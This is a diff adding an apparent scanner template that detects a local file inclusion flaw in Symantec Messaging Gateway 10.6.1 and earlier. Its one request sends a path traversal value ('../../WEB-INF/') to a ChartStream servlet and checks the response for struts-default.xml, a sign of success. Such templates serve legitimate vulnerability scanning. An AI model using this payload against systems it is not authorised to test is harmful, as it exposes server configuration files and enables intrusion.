@@ -1,0 +1,25 @@
+id: symantec-messaging-gateway
+brief:
+    title: Symantec Messaging Gateway <=10.6.1 - Local File Inclusion
+    by: Random_Robbie
+    level: high
+    about: Symantec Messaging Gateway 10.6.1 and prior are vulnerable to local file inclusion.
+    label:
+        - lfi
+        - messaging
+        - symantec
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/'
+      signs:
+        - "on": word
+          has:
+            - struts-default.xml
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
